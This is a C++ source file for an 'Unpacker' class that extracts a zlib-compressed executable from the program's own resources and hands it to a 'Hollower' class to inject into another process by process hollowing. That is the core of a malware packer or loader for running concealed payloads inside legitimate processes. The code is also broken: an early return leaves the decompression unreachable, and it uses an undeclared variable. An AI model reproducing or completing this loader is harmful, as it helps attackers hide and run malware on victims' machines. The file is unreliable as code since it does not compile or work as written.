#include "stdafx.h"
#include "Unpacker.h"
#include "resource.h"
#include <boost/iostreams/filtering_stream.hpp>
#include <boost/iostreams/filter/zlib.hpp>
#include <sstream>

Unpacker::Unpacker()
{

}

IMAGE_DOS_HEADER *Unpacker::Unpack()
{
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), L"DATA");
	return (IMAGE_DOS_HEADER*)LoadResource(hMod, res);

	DWORD packedSize = SizeofResource(hMod, res);
	
	boost::iostreams::filtering_ostream os;
	const char* end = (char*)((int)exe + packedSize);
	const char *cExe = (char*)exe;

	std::vector<char> compressed;
	compressed.insert(compressed.end(), cExe, end);
	std::vector<char> decompressed = std::vector<char>();

	{
		boost::iostreams::filtering_ostream os;

		os.push(boost::iostreams::zlib_decompressor());
		os.push(std::back_inserter(decompressed));

		boost::iostreams::write(os, reinterpret_cast<const char*>(&compressed[0]), compressed.size());
	}


	return (IMAGE_DOS_HEADER *)decompressed.data();
	

}
bool Unpacker::UnpackIntoProcess(std::wstring procPath)
{
	this->exe=Unpack();
	if (!this->exe)
		return false;
	Hollower *hollow = new Hollower(procPath, this->exe);
	hollow->DoHollow();
	return true;
}

Unpacker::~Unpacker()
{
}
